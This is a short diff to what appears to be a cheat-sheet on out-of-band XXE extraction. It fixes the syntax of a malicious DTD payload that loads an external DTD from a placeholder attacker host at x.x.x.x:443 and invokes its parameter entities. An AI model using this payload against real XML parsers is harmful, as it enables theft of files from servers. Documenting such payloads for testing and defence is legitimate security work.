@@ -13,8 +13,8 @@ OoB extraction
 <!DOCTYPE r [
 <!ELEMENT r ANY >
 <!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
-%sp
-%param1
+%sp;
+%param1;
 ]>
 
 ## External dtd: ##
